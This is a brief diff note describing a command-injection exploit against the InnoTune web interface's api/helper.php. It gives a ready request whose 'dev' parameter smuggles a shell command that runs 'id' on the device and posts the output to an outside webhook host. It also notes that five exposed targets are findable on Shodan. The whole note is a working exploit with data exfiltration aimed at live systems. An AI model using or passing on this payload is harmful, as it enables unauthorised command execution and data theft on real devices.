@@ -1,0 +1,7 @@
+https://www.innotune.at/
+
+https://github.com/sevelm/InnoTune/blob/master/webif/InnoControl/api/helper.php
+
+api/helper.php?vol=lol&dev=$(wget https://webhook.site/xxx --post-data=$(id))
+
+5 target on shodan, be nice
